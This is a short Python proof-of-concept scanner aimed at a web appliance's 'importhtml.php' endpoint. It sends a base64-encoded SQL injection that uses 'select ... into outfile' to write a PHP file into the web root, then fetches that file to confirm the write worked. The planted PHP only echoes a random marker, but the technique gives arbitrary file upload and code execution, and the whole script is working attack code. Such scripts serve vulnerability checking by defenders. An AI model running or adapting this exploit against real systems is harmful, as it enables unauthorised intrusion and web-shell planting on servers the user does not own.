import requests,re,urllib3,base64,binascii

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def base64_encoding(string):
    string=base64.b64encode(string.encode())
    return string.decode()
def randomLowercase(n):
	key=""
	zf="qwertyuiopasdfghjklzxcvbnm"
	import random
	for _ in range(n):
		suiji1=random.randint(0,len(zf)-1)
		key+=zf[suiji1]
	return key
def Hex_encoding(string):
    Hex=binascii.b2a_hex(string.encode())
    return "0x"+Hex.decode()
filename=randomLowercase(8)
content=randomLowercase(10)
phpcontent=f'<?php echo "{content}";?>'
payload=f"select {Hex_encoding(phpcontent)} into outfile '/usr/hddocs/nsg/app/{filename}.php'"
def scan(baseurl):
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+f"importhtml.php?type=exporthtmlmail&tab=tb_RCtrlLog&sql={base64_encoding(payload)}"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200:
		r0=True
	else:
		r0=False
	url=baseurl+f'app/{filename}.php'
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if content in response.text:
		r1=True
	else:
		r1=False
	if r0 and r1:
		return True
	else:
		return False
